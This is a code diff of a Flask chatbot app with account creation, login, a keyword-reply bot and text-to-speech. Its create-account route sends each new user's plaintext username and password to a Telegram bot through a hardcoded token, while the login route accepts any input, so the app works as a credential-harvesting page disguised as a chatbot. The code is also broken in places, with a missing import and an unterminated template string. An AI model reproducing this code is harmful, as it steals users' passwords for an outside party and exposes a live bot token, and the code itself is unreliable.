@@ -1,85 +1,278 @@
 from flask import Flask, render_template_string, request, jsonify, redirect, url_for
-import os
-import sqlite3
 import requests
+from gtts import gTTS
+import os
+import platform
+import random
 
+# Initialize Flask app
 app = Flask(__name__)
 
-# Replace this with your own Telegram bot token and chat ID
+# Your Telegram bot token and chat ID (Replace with your actual values)
 TELEGRAM_TOKEN = '7541018776:AAEmnQSnqUaPWDHg2yWYKCd4r7jEH-Gjut4'
-CHAT_ID = '@SidraAICRED_bot'  # Your Telegram chat ID or username
+TELEGRAM_CHAT_ID = '@SidraAIAdmin'
 
-# Initialize SQLite database
-DB_PATH = 'accounts.db'
+# English responses dictionary for chatbot
+responses = {
+    "hello": ["Hello!", "Hi there!", "Hey! How can I help you today?"],
+    "how are you": ["I'm just a bot, but I'm doing great! How about you?", "I'm fine, thank you!"],
+    "help": ["Sure! What do you need help with?", "I'm here to assist you."],
+    "bye": ["Goodbye! Have a great day!", "See you later!", "Take care!"],
+    "thank you": ["You're welcome!", "No problem at all!", "Happy to help!"],
+    "i am fine": ["Good to hear!", "Great man!", "May god bless you!"]
+}
 
-# Function to initialize the database
-def init_db():
-    if not os.path.exists(DB_PATH):
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS users
-                        (username TEXT PRIMARY KEY, password TEXT)''')
-        conn.commit()
-        conn.close()
+# Function to get a chatbot response
+def get_chatbot_response(user_input):
+    user_input = user_input.lower().strip()
+    if any(word in user_input for word in responses.keys()):
+        return random.choice(responses.get(user_input.lower(), ["Sorry, I didn't understand that."]))
+    return "Sorry, I didn't understand that."
 
-# Send credentials to Telegram
+# Function to make the chatbot speak using gTTS (Google Text-to-Speech)
+def speak(text, language="en"):
+    try:
+        # Generate speech with Google TTS
+        tts = gTTS(text=text, lang=language)
+        tts.save("response.mp3")  # Save the speech as an MP3 file
+        # Platform-specific commands to play the MP3 file
+        current_platform = platform.system().lower()
+
+        if current_platform == "windows":
+            os.system("start response.mp3")  # Windows command
+        elif current_platform == "darwin":  # macOS
+            os.system("afplay response.mp3")  # macOS command
+        elif current_platform == "linux" or current_platform == "linux2":
+            os.system("mpg321 response.mp3")  # Linux command (ensure mpg321 is installed)
+        else:
+            print("Platform not supported for automatic audio playback.")
+    except Exception as e:
+        print(f"Error in TTS: {e}")
+        return "Sorry, I couldn't speak the response at the moment."
+
+# Route for the Create Account page
+@app.route('/create_account', methods=['GET', 'POST'])
+def create_account():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        # Send credentials to Telegram
+        send_to_telegram(f"New Account Created!\nUsername: {username}\nPassword: {password}")
+        # Redirect to login page
+        return redirect(url_for('login'))
+    return render_template_string(create_account_html)
+
+# Route for the Login page
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        password = request.form['password']
+        # Handle login logic here (e.g., check if username and password match)
+        return "Logged in successfully!"  # You can redirect or show a success message
+    return render_template_string(login_html)
+
+# Route for the chatbot interaction
+@app.route('/chat', methods=['POST'])
+def chat():
+    user_input = request.json.get('message')
+    response = get_chatbot_response(user_input)
+    return jsonify({'response': response})
+
+# Route to serve the audio file for text-to-speech
+@app.route('/speak', methods=['GET'])
+def speak_text():
+    text = request.args.get('text', '')
+    language = request.args.get('language', 'en')
+    
+    try:
+        # Save the MP3 in a temporary file
+        tts = gTTS(text=text, lang=language)
+        temp_mp3_path = "response.mp3"
+        tts.save(temp_mp3_path)
+
+        # Serve the MP3 file as a response
+        return send_file(temp_mp3_path, mimetype='audio/mpeg', as_attachment=False)
+    except Exception as e:
+        print(f"Error in TTS: {e}")
+        return jsonify({"error": "Sorry, I couldn't generate the audio."})
+
+# Function to send data to Telegram
 def send_to_telegram(message):
     url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
     payload = {
-        'chat_id': CHAT_ID,
+        'chat_id': TELEGRAM_CHAT_ID,
         'text': message
     }
-    requests.post(url, data=payload)
+    response = requests.post(url, data=payload)
+    return response.json()
 
-# Function to add a new user to the database
-def add_user(username, password):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
-    conn.commit()
-    conn.close()
+# HTML Template for Create Account
+create_account_html = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        label {
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .bottom-link {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .bottom-link a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Create Account</h2>
+        <form method="POST">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Create Account</button>
+        </form>
+        <div class="bottom-link">
+            <p>Are you a current user? <a href="/login">Login here</a></p>
+        </div>
+    </div>
+</body>
+</html>
+"""
 
-# Function to check if the username and password are correct
-def check_login(username, password):
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
-    user = cursor.fetchone()
-    conn.close()
-    return user
+# HTML Template for Login Page
+login_html = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        label {
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .bottom-link {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .bottom-link a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Login</h2>
+        <form method="POST">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="bottom-link">
+            <p>Don't have an account? <a href="/create_account">Create an account</a></p>
+        </div>
+    </div>
+</body>
+</html>
+"""
 
-# Route to render the main page
+# Main Route to serve the chatbot page (you can use this as the home page)
 @app.route('/')
 def home():
     return render_template_string(html_template)
 
-# Route for account creation
-@app.route('/create_account', methods=['POST'])
-def create_account():
-    username = request.form['username']
-    password = request.form['password']
-    
-    # Add the new user to the database
-    add_user(username, password)
-
-    # Send the credentials to your Telegram
-    send_to_telegram(f"New Account Created!\nUsername: {username}\nPassword: {password}")
-
-    return redirect(url_for('home'))
-
-# Route for login
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form['username']
-    password = request.form['password']
-
-    # Check login credentials
-    if check_login(username, password):
-        return redirect(url_for('home'))
-    else:
-        return "Invalid credentials, please try again.", 401
-
-# HTML, CSS, and JavaScript for the frontend
+# HTML Template for Chatbot Interface
 html_template = """
 <!DOCTYPE html>
 <html lang="en">
@@ -88,31 +281,121 @@ html_template = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chatbot</title>
     <style>
-        /* Your styles */
-    </style>
-</head>
-<body>
-    <h1>Create Account</h1>
-    <form action="/create_account" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <button type="submit">Create Account</button>
-    </form>
+        /* Basic Styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        /* Chat container */
+        .chat-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            background-color: #f0f0f0;
+        }
+        .chat-box {
+            flex-grow: 1;
+            padding: 10px;
+            overflow-y: scroll;
+            max-height: 80%;
+            background-color: white;
+        }
+        .input-container {
+            display: flex;
+            padding: 10px;
+            background-color: #fff;
+        }
+        #user-input {
+            flex-grow: 1;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        button {
+                background-color: #4CAF50;
+                color: white;
+                padding: 10px;
+                border: none;
+                cursor: pointer;
+                border-radius: 5px;
+            }
+            button:hover {
+                background-color: #45a049;
+            }
+            .chat-message {
+                padding: 10px;
+                margin: 10px 0;
+                border-radius: 5px;
+            }
+            .user-message {
+                background-color: #e1ffc7;
+                text-align: right;
+            }
+            .bot-message {
+                background-color: #f1f1f1;
+                text-align: left;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="chat-container">
+            <div class="chat-box" id="chat-box"></div>
+            <div class="input-container">
+                <input type="text" id="user-input" placeholder="Type a message..." oninput="checkInput()" />
+                <button id="send-btn" onclick="sendMessage()" disabled>Send</button>
+            </div>
+        </div>
 
-    <h1>Login</h1>
-    <form action="/login" method="POST">
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required><br><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
-        <button type="submit">Login</button>
-    </form>
-</body>
+        <script>
+            const chatBox = document.getElementById('chat-box');
+            const userInput = document.getElementById('user-input');
+            const sendBtn = document.getElementById('send-btn');
+
+            // Function to check if user input is not empty
+            function checkInput() {
+                sendBtn.disabled = userInput.value.trim() === '';
+            }
+
+            // Function to send a message
+            async function sendMessage() {
+                const userMessage = userInput.value.trim();
+                if (userMessage === '') return;
+
+                // Display user message
+                addMessage(userMessage, 'user');
+                userInput.value = '';
+                checkInput();
+
+                // Get bot response
+                const response = await getChatbotResponse(userMessage);
+                addMessage(response, 'bot');
+
+                // Scroll to the bottom
+                chatBox.scrollTop = chatBox.scrollHeight;
+            }
+
+            // Function to get chatbot response
+            async function getChatbotResponse(userMessage) {
+                const response = await fetch('/chat', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: userMessage })
+                });
+                const data = await response.json();
+                return data.response;
+            }
+
+            // Function to add a message to the chat
+            function addMessage(message, sender) {
+                const messageElement = document.createElement('div');
+                messageElement.classList.add('chat-message', sender === 'user' ? 'user-message' : 'bot-message');
+                messageElement.textContent = message;
+                chatBox.appendChild(messageElement);
+            }
+        </script>
+    </body>
 </html>
-"""
-
 if __name__ == '__main__':
-    init_db()
     app.run(debug=True)
